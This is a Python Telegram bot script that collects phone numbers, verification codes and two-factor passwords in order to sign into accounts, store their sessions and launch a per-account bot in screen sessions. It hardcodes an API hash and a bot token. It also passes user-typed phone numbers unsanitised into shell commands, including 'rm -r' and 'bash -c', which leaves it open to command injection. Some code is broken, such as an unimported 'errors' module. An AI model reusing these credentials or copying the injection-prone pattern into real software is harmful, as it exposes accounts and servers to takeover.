import pyrogram
from telethon import Button
from telethon.sync import TelegramClient, events
import os , asyncio
import pyrogram
from pyrogram import errors as ss
api_id = 2192036
api_hash = '3b86a67fc4e14bd9dcfc2f593e75c841'
bot_token = '6176649207:AAHjWQZg6WO9IYbXPfEub7DfrLBtFduNcRE'
bot = TelegramClient('by', api_id, api_hash).start(bot_token=bot_token)

async def add_number_v1(event ,phone_number):
    bos = f'session_v1/{phone_number}'
    client = TelegramClient(bos, 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
    await client.connect()
    if not await client.is_user_authorized():
        await client.send_code_request(phone_number)
        async with bot.conversation(event.chat_id, timeout=300) as conv:
            await conv.send_message("__ارسل الكود الذي وصلك.. ضع علامة ( - ) بين كل رقم:__")
            response_verification_code = await conv.get_response()
            verification_code = str(response_verification_code.message).replace('-', '')
            try:
                await client.sign_in(phone_number, code=int(verification_code))
            except errors.SessionPasswordNeededError:
                await conv.send_message("__الحساب محمي بكلمة السر, ارسل كلمة السر :__")
                password = await conv.get_response()
                await client.sign_in(phone_number, password=password.text)
    await client.disconnect()
    uu = open('sessions.txt', 'r')
    if phone_number in uu.read():
        os.popen(f'rm -r {phone_number}')
    else:
        uu.close()
        uui = open('sessions.txt', 'a')
        uui.write(phone_number + '\n')
        uui.close()
    return "تم اضافة الرقم بنجاح ✅"

async def add_number_v2(event, phone_number):
    session_path = f'session_v2/{phone_number}'
    app = pyrogram.Client(session_path,2192036,'3b86a67fc4e14bd9dcfc2f593e75c841')
    await app.connect()
    await app.send_code(phone_number)
    async with bot.conversation(event.chat_id, timeout=300) as  conv:
        await conv.send_message("code ?")
        response_verification_code = await conv.get_response()
        verification_code = str(response_verification_code.message).replace('-', '')
        hash = await app.send_code(phone_number)
        try:
            await app.sign_in(phone_number, phone_code=verification_code, phone_code_hash=hash.phone_code_hash)
        except ss.SessionPasswordNeeded:
            await conv.send_message("Pass ?")
            password = await conv.get_response()
            await app.check_password(password=password.text)
        await app.disconnect()
        uu = open('sessions.txt', 'r')
        if phone_number in uu.read():
            os.popen(f'rm -r {phone_number}')
        else:
            uu.close()
            uui = open('sessions.txt', 'a')
            uui.write(phone_number + '\n')
            uui.close()
        return "تم اضافة الرقم بنجاح ✅"

@bot.on(events.CallbackQuery(data="Peopley"))
async def Callbacsks(event):
    sessions = open('sessions.txt', 'r')
    all = sessions.read()
    await bot.send_message(event.chat_id , all)
    sessions.close()


@bot.on(events.CallbackQuery(data="reupdate"))
async def Callbacks(event):
    sessions = open('sessions.txt', 'r')
    for num in sessions:
        phone_number = num.replace('\n','')
        os.popen(
            f"screen -dmS {phone_number} bash -c 'cp -r dex {phone_number} && cd {phone_number} && python3 main.py; exec bash'")


@bot.on(events.CallbackQuery(data="add_numberv2"))
async def Callbacks(event):
    await event.delete()
    # get information from user
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message('Phone number ?')
        phone_number_msg = await conv.get_response()
        phone_number_msg = phone_number_msg.text
        phone_number = phone_number_msg.replace('+', '').replace(' ', '')
        open('prift.txt', 'w').write(phone_number)
        await conv.send_message(f'''ثواني''')
    result = await add_number_v2(event,phone_number)
    await asyncio.sleep(5)
    await event.reply(result)
    os.popen(f"screen -dmS {phone_number} bash -c 'cp -r dexv2 {phone_number} && cd {phone_number} && python3 main.py; exec bash'")

@bot.on(events.CallbackQuery(data="add_numberv1"))
async def Callbacks(event):
    await event.delete()
    # get information from user
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message('Phone number ?')
        phone_number_msg = await conv.get_response()
        phone_number_msg = phone_number_msg.text
        phone_number = phone_number_msg.replace('+', '').replace(' ', '')
        open('prift.txt', 'w').write(phone_number)
        await conv.send_message(f'''ثواني''')
    result = await add_number_v1(event, phone_number)
    await asyncio.sleep(5)
    await event.reply(result)
    os.popen(f"screen -dmS {phone_number} bash -c 'cp -r dexv1 {phone_number} && cd {phone_number} && python3 main.py; exec bash'")
async def StartButtons(event, role):
    if role == 1:
        buttons = [[Button.inline("➕ V1", "add_numberv1")],[Button.inline("➕ V2", "add_numberv2")],[Button.inline("all", "Peopley")]]
    await event.reply("›:ُِ 𝗗َِ𝗘َِ𝗫.#¹ :)", buttons=buttons)

@bot.on(events.NewMessage(pattern='/start'))
async def BotOnStart(event):
    await StartButtons(event,1)
bot.run_until_disconnected()